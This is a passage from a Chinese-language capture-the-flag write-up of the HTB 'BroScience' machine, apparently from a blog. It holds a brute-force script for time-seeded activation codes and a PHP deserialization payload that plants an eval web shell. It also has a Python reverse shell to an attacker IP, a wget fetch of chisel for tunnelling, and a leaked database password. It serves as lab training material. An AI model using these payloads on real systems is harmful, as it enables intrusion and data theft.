class="keyword">function</span> <span class="title">rel_time</span>(<span class="params"><span class="variable">$from</span>, <span class="variable">$to</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$to</span> = ((<span class="variable">$to</span> === <span class="literal">null</span>) ? (time()) : (<span class="variable">$to</span>));</span><br><span class="line">    <span class="variable">$to</span> = ((is_int(<span class="variable">$to</span>)) ? (<span class="variable">$to</span>) : (strtotime(<span class="variable">$to</span>)));</span><br><span class="line">    <span class="variable">$from</span> = ((is_int(<span class="variable">$from</span>)) ? (<span class="variable">$from</span>) : (strtotime(<span class="variable">$from</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$units</span> = <span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;year&quot;</span>   =&gt; <span class="number">29030400</span>, <span class="comment">// seconds in a year   (12 months)</span></span><br><span class="line">        <span class="string">&quot;month&quot;</span>  =&gt; <span class="number">2419200</span>,  <span class="comment">// seconds in a month  (4 weeks)</span></span><br><span class="line">        <span class="string">&quot;week&quot;</span>   =&gt; <span class="number">604800</span>,   <span class="comment">// seconds in a week   (7 days)</span></span><br><span class="line">        <span class="string">&quot;day&quot;</span>    =&gt; <span class="number">86400</span>,    <span class="comment">// seconds in a day    (24 hours)</span></span><br><span class="line">        <span class="string">&quot;hour&quot;</span>   =&gt; <span class="number">3600</span>,     <span class="comment">// seconds in an hour  (60 minutes)</span></span><br><span class="line">        <span class="string">&quot;minute&quot;</span> =&gt; <span class="number">60</span>,       <span class="comment">// seconds in a minute (60 seconds)</span></span><br><span class="line">        <span class="string">&quot;second&quot;</span> =&gt; <span class="number">1</span>         <span class="comment">// 1 second</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$diff</span> = abs(<span class="variable">$from</span> - <span class="variable">$to</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$diff</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just now&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$suffix</span> = ((<span class="variable">$from</span> &gt; <span class="variable">$to</span>) ? (<span class="string">&quot;from now&quot;</span>) : (<span class="string">&quot;ago&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$unitCount</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$units</span> <span class="keyword">as</span> <span class="variable">$unit</span> =&gt; <span class="variable">$mult</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$diff</span> &gt;= <span class="variable">$mult</span> &amp;&amp; <span class="variable">$unitCount</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$unitCount</span> += <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// $and = (($mult != 1) ? (&quot;&quot;) : (&quot;and &quot;));</span></span><br><span class="line">            <span class="variable">$and</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$output</span> .= <span class="string">&quot;, &quot;</span>.<span class="variable">$and</span>.intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>).<span class="string">&quot; &quot;</span>.<span class="variable">$unit</span>.((intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>) == <span class="number">1</span>) ? (<span class="string">&quot;&quot;</span>) : (<span class="string">&quot;s&quot;</span>));</span><br><span class="line">            <span class="variable">$diff</span> -= intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>) * <span class="variable">$mult</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> .= <span class="string">&quot; &quot;</span>.<span class="variable">$suffix</span>;</span><br><span class="line">    <span class="variable">$output</span> = substr(<span class="variable">$output</span>, strlen(<span class="string">&quot;, &quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserPrefs</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$theme</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$theme</span> = <span class="string">&quot;light&quot;</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;theme = <span class="variable">$theme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user-prefs&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$up_cookie</span> = base64_encode(serialize(<span class="keyword">new</span> UserPrefs()));</span><br><span class="line">            setcookie(<span class="string">&#x27;user-prefs&#x27;</span>, <span class="variable">$up_cookie</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$up_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user-prefs&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$up</span> = unserialize(base64_decode(<span class="variable">$up_cookie</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$up</span>-&gt;theme;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;light&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme_class</span>(<span class="params"><span class="variable">$theme</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$theme</span>)) &#123;</span><br><span class="line">        <span class="variable">$theme</span> = get_theme();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$theme</span>, <span class="string">&quot;light&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;uk-light&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;uk-dark&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_theme</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;user-prefs&#x27;</span>,base64_encode(serialize(<span class="keyword">new</span> UserPrefs(<span class="variable">$val</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Avatar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$imgPath</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$imgPath</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;imgPath = <span class="variable">$imgPath</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$tmp</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="keyword">$this</span>-&gt;imgPath, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br><span class="line">        fclose(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$imgPath</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> Avatar(<span class="keyword">$this</span>-&gt;imgPath);</span><br><span class="line">        <span class="variable">$a</span>-&gt;save(<span class="keyword">$this</span>-&gt;tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>用户激活码生成来自于种子为<code>time()</code>的随机序列</p>
+<p>编写以下Python脚本以自动注册并枚举时间以激活</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">register_url = <span class="string">&quot;https://broscience.htb/register.php&quot;</span></span><br><span class="line">register_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;bfl2&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;bfl2@bfl.bfl&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;bfl&quot;</span>, <span class="string">&quot;password-confirm&quot;</span>: <span class="string">&quot;bfl&quot;</span>&#125;</span><br><span class="line">activate_url = <span class="string">&quot;https://broscience.htb/activate.php?code=%s&quot;</span></span><br><span class="line"></span><br><span class="line">res = req.get(url = register_url, verify = <span class="literal">False</span>)</span><br><span class="line">start_time_str = res.headers[<span class="string">&quot;Date&quot;</span>]</span><br><span class="line">start_time = subprocess.Popen(<span class="string">&quot;php -r &#x27;echo strtotime(\&quot;%s\&quot;);&#x27;&quot;</span> % start_time_str, shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = req.post(url = register_url, data = register_data, verify = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;created&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">	print(<span class="string">&quot;Created.&quot;</span>)</span><br><span class="line">end_time_str = res.headers[<span class="string">&quot;Date&quot;</span>]</span><br><span class="line">end_time = subprocess.Popen(<span class="string">&quot;php -r &#x27;echo strtotime(\&quot;%s\&quot;);&#x27;&quot;</span> % end_time_str, shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_time = <span class="built_in">int</span>(start_time)</span><br><span class="line">end_time = <span class="built_in">int</span>(end_time)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(start_time, end_time + <span class="number">1</span>):</span><br><span class="line">	code = subprocess.Popen(<span class="string">&quot;php -r &#x27;include \&quot;code.php\&quot;; echo generate_activation_code(%s);&#x27;&quot;</span> % <span class="built_in">str</span>(_), shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line">	print(code)</span><br><span class="line">	res = req.get(url = activate_url % code)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;Invalid&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">		print(<span class="string">&quot;Activated.&quot;</span>)</span><br><span class="line">		print(register_data)</span><br></pre></td></tr></table></figure>
+<p><code>code.php</code>如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># code.php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span>(<span class="params"><span class="variable">$time</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">		srand(<span class="variable">$time</span>);</span><br><span class="line">		<span class="variable">$activation_code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">			<span class="variable">$activation_code</span> = <span class="variable">$activation_code</span> . <span class="variable">$chars</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>)];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$activation_code</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>登陆后主页发现一个切换主题按钮，查看其代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252f/swap_theme.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># payload.php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if user is logged in already</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: /index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Swap the theme</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;includes/utils.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (strcmp(get_theme(), <span class="string">&quot;light&quot;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    set_theme(<span class="string">&quot;dark&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    set_theme(<span class="string">&quot;light&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Redirect</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">&#123;$_SERVER[&#x27;HTTP_REFERER&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: /index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结合<code>utils.php</code>，即可分析出如下反序列化漏洞利用过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcmp(get_theme(), <span class="string">&quot;light&quot;</span>) === <span class="number">0</span>) -&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme</span>(<span class="params"></span>) -&gt;</span></span><br><span class="line">$up_cookie = $_COOKIE[&#x27;user-prefs&#x27;]; -&gt;</span><br><span class="line"><span class="variable">$up</span> = unserialize(base64_decode(<span class="variable">$up_cookie</span>)); -&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> -&gt;</span></span><br><span class="line">public function __wakeup() -&gt; </span><br><span class="line">fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br></pre></td></tr></table></figure>
+<p>在<code>$up = unserialize(base64_decode($up_cookie));</code>这步过程中，序列化结果加入一个<code>AvatarInterface</code>对象，反序列化构造这个<code>AvatarInterface</code>对象时会调用<code>__wakeup()</code></p>
+<p>编写<code>payload.php</code>如下，使用<code>php://input</code>和POST数据配合进行内容写入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Avatar</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$imgPath</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$imgPath</span></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;imgPath = <span class="variable">$imgPath</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$tmp</span></span>) </span>&#123;</span><br><span class="line">			<span class="variable">$f</span> = fopen(<span class="keyword">$this</span>-&gt;imgPath, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">			fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br><span class="line">			fclose(<span class="variable">$f</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$imgPath</span>; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="variable">$a</span> = <span class="keyword">new</span> Avatar(<span class="keyword">$this</span>-&gt;imgPath);</span><br><span class="line">			<span class="variable">$a</span>-&gt;save(<span class="keyword">$this</span>-&gt;tmp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">UserPrefs</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$theme</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$theme</span> = <span class="string">&quot;light&quot;</span></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;theme = <span class="variable">$theme</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">payload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$BFL</span> = <span class="keyword">new</span> UserPrefs();</span><br><span class="line">		<span class="variable">$BFL</span>-&gt;theme = <span class="keyword">new</span> AvatarInterface();</span><br><span class="line">		<span class="variable">$BFL</span>-&gt;theme-&gt;imgPath = <span class="string">&quot;/var/www/html/BFL.php&quot;</span>;</span><br><span class="line">		<span class="variable">$BFL</span>-&gt;theme-&gt;tmp = <span class="string">&quot;php://input&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$BFL</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	payload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>生成Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -f payload.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO086MTU6IkF2YXRhckludGVyZmFjZSI6Mjp7czozOiJ0bXAiO3M6MTE6InBocDovL2lucHV0IjtzOjc6ImltZ1BhdGgiO3M6MjE6Ii92YXIvd3d3L2h0bWwvQkZMLnBocCI7fX0&#x3D;</span><br></pre></td></tr></table></figure>
+<p><code>PHPSESSID</code>为登陆后服务器给的值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://broscience.htb/swap_theme.php -H <span class="string">&quot;Cookie: PHPSESSID=5l9ql8diuiej262srrp4chu47e; user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO086MTU6IkF2YXRhckludGVyZmFjZSI6Mjp7czozOiJ0bXAiO3M6MTE6InBocDovL2lucHV0IjtzOjc6ImltZ1BhdGgiO3M6MjE6Ii92YXIvd3d3L2h0bWwvQkZMLnBocCI7fX0=&quot;</span> -d <span class="string">&#x27;&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
+<p>即可在<code>/var/www/html/BFL.php</code>写入内容<code>&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;</code></p>
+<p>构造反弹Shell语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9998));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure>
+<p>进行反弹Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://broscience.htb/BFL.php -d <span class="string">&#x27;BFL=system(base64_decode(&quot;BASE64_ENCODED_PAYLOAD&quot;));&#x27;</span> --insecure</span><br></pre></td></tr></table></figure>
+<p>获取Shell之后获取tty并查看端口监听信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure>
+<p>确认5432端口有服务在运行中</p>
+<p>使用chisel进行端口转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel_1.8.1_linux_amd64 server -p 9997 --reverse &amp;</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.16.3/chisel_1.8.1_linux_amd64</span><br><span class="line">chmod +x chisel_1.8.1_linux_amd64</span><br><span class="line">./chisel_1.8.1_linux_amd64 client 10.10.16.3:9997 R:9996:127.0.0.1:5432</span><br></pre></td></tr></table></figure>
+<p>在本机上连接postgresql</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psql -h 0.0.0.0 -p 9996 -U dbuser -d broscience -W</span><br><span class="line">RangeOfMotion%777</span><br></pre></td></tr></table></figure>
+<p>查看数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\l</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                  List of databases</span><br><span class="line">    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   </span><br><span class="line">------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------</span><br><span class="line"> broscience | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | </span><br><span class="line"> postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | </span><br><span class="line"> template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | &#x3D;c&#x2F;postgres          +</span><br><span class="line">            |          |          |             |             |            |                 | postgres&#x3D;CTc&#x2F;postgres</span><br><span class="line"> template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | &#x3D;c&#x2F;postgres          +</span><br><span class="line">            |          |          |             |             |            |                 | postgres&#x3D;CTc&#x2F;postgres</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>查看数据库<code>broscience</code>中的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\c broscience</span><br><span class="line">RangeOfMotion%777</span><br><span class="line">\dt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">           List of relations</span><br><span class="line"> Schema |   Name    | Type  |  Owner   </span><br><span class="line">--------+-----------+-------+----------</span><br><span class="line"> public | comments  | table | postgres</span><br><span class="line"> public | exercises | table | postgres</span><br><span class="line"> public | users     | table | postgres</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure>
+<p>查看users表中数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users;</span><br></pre></td></tr></table></figure>
